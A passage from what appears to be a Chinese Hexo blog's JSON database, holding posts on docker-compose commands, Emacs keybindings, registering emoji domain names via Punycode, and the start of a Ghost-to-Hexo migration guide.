设置一个项目名称（默认是directory名）</p>\n<p>docker-compose的动作包括：</p>\n<p>build：构建服务</p>\n<p>kill -s SIGINT：给服务发送特定的信号。</p>\n<p>logs：输出日志</p>\n<p>port：输出绑定的端口</p>\n<p>ps：输出运行的容器</p>\n<p>pull：pull服务的image</p>\n<p>rm：删除停止的容器</p>\n<p>run: 运行某个服务，例如docker-compose run web<br>python manage.py shell</p>\n<p>start：运行某个服务中存在的容器。</p>\n<p>stop:停止某个服务中存在的容器。</p>\n<p>up：create + run + attach容器到服务。</p>\n<p>scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3</p>\n<blockquote>\n<p>转载:<a href=\"http://debugo.com/docker-compose\">http://debugo.com/docker-compose</a></p>\n</blockquote>"},{"title":"Emacs 命令大全","id":"5","updated":"2016-08-05T20:14:03.000Z","date":"2016-07-29T01:10:07.000Z","_content":"\n\n**emacs命令**是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n<!-- more --> \n## # 语法\n\nemacs(选项)(参数)\n\n## #选项\n\n<pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n## #参数\n\t文件：指定要编辑的文本文件。\n\n## #emacs命令操作大全\n\n基本命令\n\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n编辑\n\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n移动光标\n\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\nBuffer 相关\n\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n拷贝与粘贴\n\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n搜索和替换\n\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\nTags\n\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n书签\n\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n帮助\n\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n其它\n\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","source":"_posts/Emacs-命令大全.md","raw":"---\ntitle: Emacs 命令大全\ntags: 'Linux'\npermalink: emacs-da-quan\nid: 5\nupdated: '2016-08-05 21:14:03'\ndate: 2016-07-29 02:10:07\n---\n\n\n**emacs命令**是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。\n<!-- more --> \n## # 语法\n\nemacs(选项)(参数)\n\n## #选项\n\n<pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n## #参数\n\t文件：指定要编辑的文本文件。\n\n## #emacs命令操作大全\n\n基本命令\n\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n编辑\n\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n移动光标\n\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\nBuffer 相关\n\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n拷贝与粘贴\n\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n搜索和替换\n\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\nTags\n\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n书签\n\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n帮助\n\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n其它\n\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","slug":"emacs-da-quan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnp000c5es5dls65m31","content":"<p><strong>emacs命令</strong>是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。<br><a id=\"more\"></a> </p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"# 语法\"></a># 语法</h2><p>emacs(选项)(参数)</p>\n<h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"#选项\"></a>#选项</h2><pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</span></pre>\n\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"#参数\"></a>#参数</h2><pre><code>文件：指定要编辑的文本文件。\n</code></pre><h2 id=\"emacs命令操作大全\"><a href=\"#emacs命令操作大全\" class=\"headerlink\" title=\"#emacs命令操作大全\"></a>#emacs命令操作大全</h2><p>基本命令</p>\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n<p>编辑</p>\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n<p>移动光标</p>\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\n<p>Buffer 相关</p>\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n<p>拷贝与粘贴</p>\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n<p>搜索和替换</p>\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\n<p>Tags</p>\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n<p>书签</p>\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n<p>帮助</p>\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n<p>其它</p>\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>\n","excerpt":"<p><strong>emacs命令</strong>是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。<br>","more":"</p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"# 语法\"></a># 语法</h2><p>emacs(选项)(参数)</p>\n<h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"#选项\"></a>#选项</h2><pre>+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；\n-q：启动emacs编辑器，而不加载初始化文件；\n-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；\n-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；\n-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；\n-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；\n-<span class=\"wp_keywordlink\">[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。</pre>\n\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"#参数\"></a>#参数</h2><pre><code>文件：指定要编辑的文本文件。\n</code></pre><h2 id=\"emacs命令操作大全\"><a href=\"#emacs命令操作大全\" class=\"headerlink\" title=\"#emacs命令操作大全\"></a>#emacs命令操作大全</h2><p>基本命令</p>\n<pre>C-x C-c : 退出Emacs\nC-x C-f : 打开一个文件，如果文件不存在，则创建一个文件\nC-g : 取消未完成的命令</pre>\n\n<p>编辑</p>\n<pre>C-z (redefined): Undo；原来C-z是挂起Emacs（然后用<span class=\"wp_keywordlink\">[fg](http://man.linuxde.net/fg \"fg命令\")</span>命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo\nM-d : 删除光标后的词语</pre>\n\n<p>移动光标</p>\n<pre>C-v : 向前翻页\nM-v : 向后翻页\nM-r : 将光标移动到屏幕中间那行\nC-a : 移到行首\nM-a : 移到句首，从行首到句首之间可能有空格\nC-e : 移到行尾\nM-e : 移到句尾\nM-{ : 向上移动一段\nM-} : 向下移动一段\nC-right : 向前移动一个单词\nC-left : 向后移动一个单词\nC-up : 向前移动一段\nC-down : 向后移动一段\nM-&lt; : 移到整个文本开头\nM-&gt; : 移到整个文本末尾\nC-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以\nM-x goto-line : 移动到某一行\nC-l : 重绘屏幕，效果就是当前编辑行移动窗口中央</pre>\n\n<p>Buffer 相关</p>\n<pre>C-x k : 关闭当前buffer\nC-x b : 切换到前一个编辑的buffer\nC-x C-b : 列出当前所有buffer\nC-x C-s : 保存当前buffer\nC-x s : 保存所有未保存的buffer，会提示你是否需要保存\nC-x C-<span class=\"wp_keywordlink\">[w](http://man.linuxde.net/w \"w命令\")</span> : 文件另存为</pre>\n\n<p>拷贝与粘贴</p>\n<pre>M-space (redefined): 设置mark; C-@ 是默认命令\nC-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行\nM-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行\nC-k : 从当前位置剪切到行尾\nC-y : 粘贴\nM-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。\nC-x r k : 执行矩形区域的剪切\nC-x r y : 执行矩形区域的粘贴</pre>\n<pre>窗口操作\nC-x 0 : 关闭当前窗口\nC-x 1 : 将当前窗口最大化\nC-x 2 : 垂直分割窗口\nC-x 3 : 水平分割窗口\nM-o (redefined) : 在窗口之间切换; C-x o 是默认命令\nC-x 5 1/2/3/0 : 对frame类似的操作\nC-x &lt; : 窗口内容右卷\nC-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用）\n(C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行\n(C-u) C-x } : 加宽当前窗口\n(C-u) C-x { : 压窄当前窗口\nESC C-v : 在其它窗口进行卷屏操作</pre>\n\n<p>搜索和替换</p>\n<pre>C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标\nC-s RET : 普通搜索\nC-r : 向前搜索\nC-s RET C-w : 按单词查询\nM-% : 查询替换，也就是替换前会询问一下\nM-x replace-string : 普通替换</pre>\n\n<p>Tags</p>\n<pre>M-! etags .c .h : 创建TAGS文件\nM-. : 跳到tag所在位置\nM-x list-tags : 列出tags</pre>\n\n<p>书签</p>\n<pre>C-x r m : 设置书签bookmark\nC-x r b : 跳到bookmark处</pre>\n\n<p>帮助</p>\n<pre>C-h ? : 查看帮助信息\nC-h f : 查看一个函数\nC-h v : 查看一个变量\nC-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略)\nC-h C-f : 查看一个函数的<span class=\"wp_keywordlink\">[info](http://man.linuxde.net/info \"info命令\")</span>，非常有用\nC-h i : 看Info</pre>\n\n<p>其它</p>\n<pre>C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化\nC-x h : 全部选中\nM-! : 执行外部shell命令\nM-x shell : 模拟shell的buffer\nM-x term : 模拟terminal, C-c k 关闭terminal\nC-x C-q : 修改buffer的只读属性</pre>"},{"title":"Emoji 表情域名 引领未来","date":"2016-12-27T03:37:27.000Z","header-img":"/content/images/emoji/background.jpg","_content":"\n国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂\n\n![](/content/images/emoji/1.jpg)\n\nEmoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。\n\n我也顺势跟风，注册了一个坑爹的TK域名。\n\n[💌.tk](http://💌.tk)\n\n![](/content/images/emoji/emoji.jpg)\n\n# 查询\n\n在chrome浏览器上直接输入[想要注册的表情].com\n\n按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。\n\n\n💌.tk\n\n转换为：\n\nhttp://xn--rr8h.tk/\n\n\n\n# 注册\n\n拿着自己的域名转换后的字符，比如xn--rr8h，去Godaddy或者别的域名网站直接搜就好啦。\n\n注意：\n\n.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。\n\n\n\n# 参考资料\n\n[🐔.ws](http://🌶️🐔.ws)\n","source":"_posts/Emoji表情域名-引领未来.md","raw":"---\ntitle: Emoji 表情域名 引领未来\ndate: 2016-12-27 03:37:27\npermalink: emoji\ntags: Web\ncategories: Web\nheader-img: \"/content/images/emoji/background.jpg\"\n\n---\n\n国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂\n\n![](/content/images/emoji/1.jpg)\n\nEmoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。\n\n我也顺势跟风，注册了一个坑爹的TK域名。\n\n[💌.tk](http://💌.tk)\n\n![](/content/images/emoji/emoji.jpg)\n\n# 查询\n\n在chrome浏览器上直接输入[想要注册的表情].com\n\n按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。\n\n\n💌.tk\n\n转换为：\n\nhttp://xn--rr8h.tk/\n\n\n\n# 注册\n\n拿着自己的域名转换后的字符，比如xn--rr8h，去Godaddy或者别的域名网站直接搜就好啦。\n\n注意：\n\n.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。\n\n\n\n# 参考资料\n\n[🐔.ws](http://🌶️🐔.ws)\n","slug":"emoji","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnr000g5es59b4ahbif","content":"<p>国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂</p>\n<p><img src=\"/content/images/emoji/1.jpg\" alt=\"\"></p>\n<p>Emoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。</p>\n<p>我也顺势跟风，注册了一个坑爹的TK域名。</p>\n<p><a href=\"http://💌.tk\" target=\"_blank\" rel=\"external\">💌.tk</a></p>\n<p><img src=\"/content/images/emoji/emoji.jpg\" alt=\"\"></p>\n<h1 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h1><p>在chrome浏览器上直接输入[想要注册的表情].com</p>\n<p>按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。</p>\n<p>💌.tk</p>\n<p>转换为：</p>\n<p><a href=\"http://xn--rr8h.tk/\" target=\"_blank\" rel=\"external\">http://xn--rr8h.tk/</a></p>\n<h1 id=\"注册\"><a href=\"#注册\" class=\"headerlink\" title=\"注册\"></a>注册</h1><p>拿着自己的域名转换后的字符，比如xn–rr8h，去Godaddy或者别的域名网站直接搜就好啦。</p>\n<p>注意：</p>\n<p>.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"http://🌶️🐔.ws\" target=\"_blank\" rel=\"external\">🐔.ws</a></p>\n","excerpt":"","more":"<p>国外媒体报道，《牛津词典》(Oxford Dictionaries)今日公布了2015年年度词汇。今年的年度“词汇”很难发音，因为它并不是由字母组成，而是一个黄色的卡通笑脸，带着两滴眼泪。😂</p>\n<p><img src=\"/content/images/emoji/1.jpg\" alt=\"\"></p>\n<p>Emoji 等 Unicode 字符，浏览器Punycode的方式将 Unicode字符用ASCII进行编码。</p>\n<p>我也顺势跟风，注册了一个坑爹的TK域名。</p>\n<p><a href=\"http://💌.tk\">💌.tk</a></p>\n<p><img src=\"/content/images/emoji/emoji.jpg\" alt=\"\"></p>\n<h1 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h1><p>在chrome浏览器上直接输入[想要注册的表情].com</p>\n<p>按下回车键，chrome浏览器会自动帮你转换为ASCII编码方式的格式。</p>\n<p>💌.tk</p>\n<p>转换为：</p>\n<p><a href=\"http://xn--rr8h.tk/\">http://xn--rr8h.tk/</a></p>\n<h1 id=\"注册\"><a href=\"#注册\" class=\"headerlink\" title=\"注册\"></a>注册</h1><p>拿着自己的域名转换后的字符，比如xn–rr8h，去Godaddy或者别的域名网站直接搜就好啦。</p>\n<p>注意：</p>\n<p>.com域名目前无法注册任何包含emoji表情字符的域名，尚未开发，一旦开放，又是一笔巨大的商机。</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"http://🌶️🐔.ws\">🐔.ws</a></p>\n"},{"title":"GHOST搬迁到HEXO(Github Pages)指南","date":"2016-09-12T20:41:59.000Z","_content":"# 前言\n\n想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n# 前提\n在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n* 安装HEXO\n* 配置Github\n\n# 搬家\n## 第一步\nGhost导出数据json：实验室-导出，下载好json\n\n## 第二步\n安装搬家工具\n```\nnpm i hexo-migrator-ghost --save  \n```\n## 第三步\n\n修改`./scaffolds/post.md`文件内容为：\n\n```\ntitle: {{ title }}  \ndate: {{ date }}  \ntags: {{ tags }}  \n---\n```\n## 第四步\n将json文件放到根目录，并且执行：\n\n```\nhexo migrate ghost source.json  \nhexo clean ; hexo d -g \n```\n\n# 注意\n经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n* HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\n* tag可能会出问题，会自动加--，请自行删除，或者批量删除","source":"_posts/GHOST搬迁到HEXO-Github-Pages-指南.md","raw":"---\ntitle: GHOST搬迁到HEXO(Github Pages)指南\ndate: 2016-09-12 21:41:59\ntags: Web\ncategories: Web\n---\n# 前言\n\n想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n# 前提\n在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n* 安装HEXO\n* 配置Github\n\n# 搬家\n## 第一步\nGhost导出数据json：实验室-导出，下载好json\n\n## 第二步\n安装搬家工具\n```\nnpm i hexo-migrator-ghost --save  \n```\n## 第三步\n\n修改`./scaffolds/post.md`文件内容为：\n\n```\ntitle: {{ title }}  \ndate: {{ date }}  \ntags: {{ tags }}  \n---\n```\n## 第四步\n将json文件放到根目录，并且执行：\n\n```\nhexo migrate ghost source.json  \nhexo clean ; hexo d -g \n```\n\n# 注意\n经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n* HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\n* tag可能会出问题，会自动加--，请自行删除，或者批量删除","slug":"GHOST搬迁到HEXO-Github-Pages-指南","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnt000i5es59eepn69y","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>\n<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" 